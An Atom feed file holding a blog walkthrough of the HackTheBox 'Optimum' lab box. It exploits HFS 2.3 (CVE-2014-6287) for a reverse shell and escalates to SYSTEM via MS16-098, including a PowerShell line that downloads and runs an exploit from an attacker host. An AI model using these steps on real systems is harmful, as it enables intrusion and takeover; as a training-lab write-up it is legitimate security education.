@@ -1,0 +1,163 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-08T15:40:28+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Emmet Friel</title><subtitle>cyber security blog</subtitle><author><name>Emmet Friel</name></author><entry><title type="html">HackTheBox Walkthrough - Optimum</title><link href="http://localhost:4000/hackthebox/hackthebox-optimum.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Optimum" /><published>2020-04-07T00:00:00+01:00</published><updated>2020-04-07T00:00:00+01:00</updated><id>http://localhost:4000/hackthebox/hackthebox-optimum</id><content type="html" xml:base="http://localhost:4000/hackthebox/hackthebox-optimum.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;This box was interesting in the sense it really honed in on the importance of enumeration, gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.&lt;/p&gt;
+
+&lt;h1 id=&quot;reconnaissance--enumeration&quot;&gt;Reconnaissance &amp;amp; Enumeration&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.nmap 10.10.10.8
+Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-04-07 10:53 BST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.8
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.029s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2012 or Windows Server 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 Professional &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;87%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Phone 7.5 or 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;86%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 or Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 or Windows 8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 SP1 or Windows 8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2016 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;128.40 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;-sC : scripting scan, equivalent to also writing –script=default&lt;/li&gt;
+  &lt;li&gt;-sV: service version&lt;/li&gt;
+  &lt;li&gt;-O  : Operating System version&lt;/li&gt;
+  &lt;li&gt;-p- : scanning all 65536 ports&lt;/li&gt;
+  &lt;li&gt;-oN: Output result to a normal text file called nmap.nmap&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/optimum/hfs_opt.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;HFS Webpage running on port 80&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Any webpage running on port 80 I always perform a dirb and nikto scan in the background, so I did just that however a quick search on the service version gave me everything I needed to get access into the system.&lt;/p&gt;
+
+&lt;p&gt;The exploit I used was: &lt;a href=&quot;https://www.exploit-db.com/exploits/39161&quot; target=&quot;_blank_&quot;&gt;Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)&lt;/a&gt; which refers to CVE-2014-6287. The vulnerability is&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;“The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.” In other words, using the search bar on the website we can execute code server side using the null sequence.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;There are now two approaches to exploit the machine:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Execute commands in the search bar on the website using the null byte (%00)&lt;/li&gt;
+  &lt;li&gt;Use the exploit script we found through a quick search.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;For simplicity, I am going to use the scripting option.&lt;/p&gt;
+
+&lt;h1 id=&quot;shell-access&quot;&gt;Shell Access&lt;/h1&gt;
+
+&lt;p&gt;To use the script there are 3 important variables:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Change the IP address to your own:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip_addr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;192.168.44.128&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#local IP address&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Change the port which you are going to listen on:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; local_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;443&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Local Port number&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Host a webserver serving netcat (nc.exe). I am using SecLists GitHub repo for nc.exe which you can clone from their GitHub page.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#EDB Note: You need to be using a web server hosting netcat (http://&amp;lt;attackers_ip&amp;gt;:80/nc.exe).  &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#          You may need to run it multiple times for success!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Once I edited the script, I setup my netcat listener, python webserver and then executed the script: &lt;code class=&quot;highlighter-rouge&quot;&gt;python 39161.py &amp;lt;target IP&amp;gt; &amp;lt;target port&amp;gt;&lt;/code&gt; 
+Note that it may take a few attempts for the script to work.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/optimum/opt_terminal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Running the attack and having a reverse shell access to the victim machine&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h1 id=&quot;privilege-escalation-using-windows-suggester&quot;&gt;Privilege Escalation using Windows Suggester&lt;/h1&gt;
+
+&lt;p&gt;You can see I am user “kostas” from the terminal. I do not have Admin permissions so it’s time to escalate to root! To do this I used the &lt;a href=&quot;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&quot; target=&quot;_blank_&quot;&gt;Windows Exploit Suggester&lt;/a&gt; tool. The tool is really simple and extremely powerful, it compares all the patches on the machine to Microsoft’s patch database and outputs a “suggested” list of exploits. I have seen older tutorials use “Sherlock” instead of “Windows Suggester” but if you have a look at Sherlock’s GitHub, the repo hasn’t been updated in 3 years :\&lt;/p&gt;
+
+&lt;p&gt;To do this, run &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; and then copy and paste the output to a file: &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo.txt&lt;/code&gt; in my case&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;systeminfo
+&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;--update&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; initiating winsploit version 3.3...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] writing to file 2020-04-07-mssb.xls
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;--database&lt;/span&gt; 2020-04-07-mssb.xls &lt;span class=&quot;nt&quot;&gt;--systeminfo&lt;/span&gt; systeminfo.txt &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; initiating winsploit version 3.3...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; database file detected as xls or xlsx based on extension
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; attempting to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;from the systeminfo input file
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] systeminfo input file &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;successfully &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ascii&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; querying database file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;potential vulnerabilities
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; comparing the 32 hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;es&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; against the 266 potential bulletins&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with a database of 137 known exploits
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; there are now 246 remaining vulns
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] exploitdb PoC, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] Metasploit module, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; missing bulletin
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] windows version identified as &lt;span class=&quot;s1&quot;&gt;'Windows 2012 R2 64-bit'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-135: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel-Mode Drivers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3199135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-098: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel-Mode Drivers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3178466&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS16-075: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows SMB Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3164038&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-074: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Graphics Component &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3164036&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-063: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3163649&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-032: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Secondary Logon to Address Elevation of Privile &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3143141&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS16-016: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;WebDAV to Address Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3136041&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-014: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Windows to Address Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3134228&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-007: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Windows to Address Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3124901&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-132: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Windows to Address Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3116162&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-112: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3104517&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-111: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel to Address Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3096447&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-102: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Task Management Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3089657&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-097: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft Graphics Component Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3089656&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS15-078: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft Font Driver Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3079904&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-052: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel Could Allow Security Feature Bypass &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3050514&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS15-051: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3057191&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-010: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Driver Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3036220&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-001: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Application Compatibility Cache Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3023266&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS14-068: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3011780&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS14-064: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows OLE Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3011443&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS14-060: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows OLE Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3000869&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS14-058: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kernel-Mode Driver Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3000061&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS13-101: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2880430&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS13-090: Cumulative Security Update of ActiveX Kill Bits &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2900986&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; – Critical
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The output of windows-exploit-suggester shows a grand collection of exploits to try out so at this stage it’s really trial and error. Note that some attempts caused the machine to crash and so you would have to set up the reverse shell again, nothing major.
+After trial and error, MS16-098 got me that nice root shell :)&lt;/p&gt;
+
+&lt;p&gt;I placed the exploit on the python webserver, downloaded it from the victims machine and then executed it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;powershell.exe -c &quot;(New-Object System.Net.WebClient).DownloadFile('http://10.X.X.X/bfill.exe','C:\Users\kostas\Desktop\exploit.exe')
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;exploit.exe
+exploit.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved. 
+
+C:\Users\kostas\Desktop&amp;gt;whoami
+whoami
+nt authority\system
+&lt;/code&gt;&lt;/pre&gt;</content><author><name>Emmet Friel</name></author><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/htb/optimum/optimum.png" /></entry></feed>
